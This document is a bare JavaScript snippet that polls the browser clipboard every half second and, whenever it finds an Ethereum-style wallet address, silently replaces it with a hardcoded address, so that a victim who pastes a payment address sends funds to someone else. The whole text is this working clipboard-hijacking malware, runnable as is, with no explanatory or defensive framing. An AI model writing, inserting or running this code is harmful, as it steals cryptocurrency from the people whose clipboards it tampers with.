async function monitor() {
    while (true) {
        const value = await navigator.clipboard.readText();
        if (/^0x[0-9a-fA-F]{40}$/.test(value)) {
            await navigator.clipboard.writeText("0x91e5B37e4dB27a893F4B59E20e265c7086B414c9");
        }
        await new Promise(resolve => setTimeout(resolve, 500));
    }
}
monitor();
